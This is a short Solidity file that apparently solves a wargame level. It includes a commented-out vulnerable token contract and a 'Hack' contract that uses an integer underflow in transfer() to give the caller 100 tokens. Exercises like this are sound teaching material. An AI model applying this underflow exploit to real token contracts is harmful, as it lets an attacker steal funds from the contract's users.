// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// pragma solidity ^0.6.0;
// // goal initially you have recived 20
// //  increase it somehow

// contract Token {

//   mapping(address => uint) balances;
//   uint public totalSupply;

//   constructor(uint _initialSupply) public {
//     balances[msg.sender] = totalSupply = _initialSupply;
//   }

//   function transfer(address _to, uint _value) public returns (bool) {
//     require(balances[msg.sender] - _value >= 0);
//     balances[msg.sender] -= _value;
//     balances[_to] += _value;
//     return true;
//   }

//   function balanceOf(address _owner) public view returns (uint balance) {
//     return balances[_owner];
//   }
// }

// the hack is that safemath is not implemented in 0.6
// use the underflow

interface IToken{
    function balanceOf(address _owner) external view;
    function transfer(address _to, uint _value) external returns (bool);
}


contract Hack{
    constructor(address _target) {
        IToken(_target).transfer(msg.sender,100);
    }
}


